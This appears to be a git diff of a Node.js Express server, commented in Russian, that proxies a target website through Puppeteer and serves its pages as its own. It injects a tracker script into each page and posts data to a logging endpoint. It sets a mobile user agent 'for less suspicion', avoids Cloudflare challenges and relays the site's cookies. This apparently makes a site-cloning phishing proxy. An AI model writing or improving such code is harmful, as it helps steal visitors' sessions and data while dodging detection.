@@ -235,116 +235,85 @@ app.post('/api/log', async (req, res) => {
   }
 });
 
-// Прокси через обычный HTTP (быстрее и капча работает)
+// Прокси через Puppeteer
 app.get('*', async (req, res) => {
   const url = TARGET_SITE + req.path + (req.url.includes('?') ? req.url.substring(req.url.indexOf('?')) : '');
   console.log('Fetching:', url);
   
+  let page = null;
   try {
-    const https = require('https');
-    const http = require('http');
-    const urlModule = require('url');
+    const br = await getBrowser();
+    page = await br.newPage();
     
-    const parsedUrl = urlModule.parse(url);
-    const protocol = parsedUrl.protocol === 'https:' ? https : http;
+    page.setDefaultTimeout(30000);
+    page.setDefaultNavigationTimeout(30000);
     
-    const options = {
-      hostname: parsedUrl.hostname,
-      port: parsedUrl.port,
-      path: parsedUrl.path,
-      method: req.method,
-      headers: {
-        'User-Agent': req.headers['user-agent'] || 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-        'Accept': req.headers.accept || 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-        'Accept-Language': req.headers['accept-language'] || 'en-US,en;q=0.9',
-        'Accept-Encoding': 'gzip, deflate, br',
-        'Connection': 'keep-alive',
-        'Upgrade-Insecure-Requests': '1'
-      }
-    };
+    // Мобильный User-Agent для меньшей подозрительности
+    await page.setUserAgent('Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1');
+    await page.setViewport({ width: 390, height: 844 });
     
-    // Передаём cookies если есть
+    // Устанавливаем cookies если есть
     if (req.headers.cookie) {
-      options.headers['Cookie'] = req.headers.cookie;
+      const cookies = req.headers.cookie.split(';').map(c => {
+        const [name, ...rest] = c.trim().split('=');
+        return { name, value: rest.join('='), domain: new URL(TARGET_SITE).hostname };
+      });
+      await page.setCookie(...cookies);
     }
     
-    const proxyReq = protocol.request(options, (proxyRes) => {
-      // Собираем данные
-      let data = [];
-      
-      proxyRes.on('data', (chunk) => {
-        data.push(chunk);
-      });
-      
-      proxyRes.on('end', () => {
-        let body = Buffer.concat(data);
-        
-        // Если это HTML - обрабатываем
-        const contentType = proxyRes.headers['content-type'] || '';
-        if (contentType.includes('text/html')) {
-          let html = body.toString('utf-8');
-          
-          // Добавляем base tag
-          const baseUrl = new URL(TARGET_SITE);
-          if (html.includes('<head>')) {
-            html = html.replace('<head>', `<head>\n<base href="${baseUrl.origin}/">`);
-          }
-          
-          // Проверяем Cloudflare
-          const isCloudflare = html.includes('cf-challenge') || 
-                               html.includes('Just a moment') || 
-                               html.includes('Verify you are human');
-          
-          // Внедряем трекер только если НЕ Cloudflare
-          if (!isCloudflare) {
-            if (html.includes('</body>')) {
-              html = html.replace('</body>', trackerScript + '</body>');
-            } else {
-              html += trackerScript;
-            }
-          }
-          
-          body = Buffer.from(html, 'utf-8');
-          
-          // Обновляем Content-Length
-          proxyRes.headers['content-length'] = body.length;
-        }
-        
-        // Убираем проблемные заголовки
-        delete proxyRes.headers['content-security-policy'];
-        delete proxyRes.headers['x-frame-options'];
-        
-        // Отправляем ответ
-        res.writeHead(proxyRes.statusCode, proxyRes.headers);
-        res.end(body);
+    await page.goto(url, { waitUntil: 'domcontentloaded', timeout: 30000 });
+    await page.waitForTimeout(2000);
+    
+    let html = await page.content();
+    
+    // Получаем cookies после загрузки
+    const pageCookies = await page.cookies();
+    
+    // Добавляем base tag
+    const baseUrl = new URL(TARGET_SITE);
+    if (html.includes('<head>')) {
+      html = html.replace('<head>', `<head>\n<base href="${baseUrl.origin}/">`);
+    }
+    
+    // Проверяем Cloudflare
+    const isCloudflare = html.includes('cf-challenge') || 
+                         html.includes('Just a moment') || 
+                         html.includes('Verify you are human');
+    
+    // Внедряем трекер только если НЕ Cloudflare
+    if (!isCloudflare) {
+      if (html.includes('</body>')) {
+        html = html.replace('</body>', trackerScript + '</body>');
+      } else {
+        html += trackerScript;
+      }
+    }
+    
+    // Устанавливаем cookies в ответ
+    pageCookies.forEach(cookie => {
+      res.cookie(cookie.name, cookie.value, {
+        domain: cookie.domain,
+        path: cookie.path,
+        expires: cookie.expires > 0 ? new Date(cookie.expires * 1000) : undefined,
+        httpOnly: cookie.httpOnly,
+        secure: cookie.secure,
+        sameSite: cookie.sameSite || 'lax'
       });
     });
     
-    proxyReq.on('error', (err) => {
-      console.error('Proxy error:', err);
-      res.status(500).send(`
-        <html><body style="font-family:sans-serif;padding:20px;">
-          <h2>❌ Ошибка загрузки</h2>
-          <p>${err.message}</p>
-        </body></html>
-      `);
-    });
-    
-    // Передаём тело запроса если POST
-    if (req.method === 'POST' || req.method === 'PUT') {
-      req.pipe(proxyReq);
-    } else {
-      proxyReq.end();
-    }
+    res.setHeader('Content-Type', 'text/html; charset=utf-8');
+    res.send(html);
     
   } catch (err) {
     console.error('Error:', err.message);
     res.status(500).send(`
       <html><body style="font-family:sans-serif;padding:20px;">
-        <h2>❌ Ошибка</h2>
+        <h2>❌ Ошибка загрузки</h2>
         <p>${err.message}</p>
       </body></html>
     `);
+  } finally {
+    if (page) await page.close().catch(() => {});
   }
 });
 
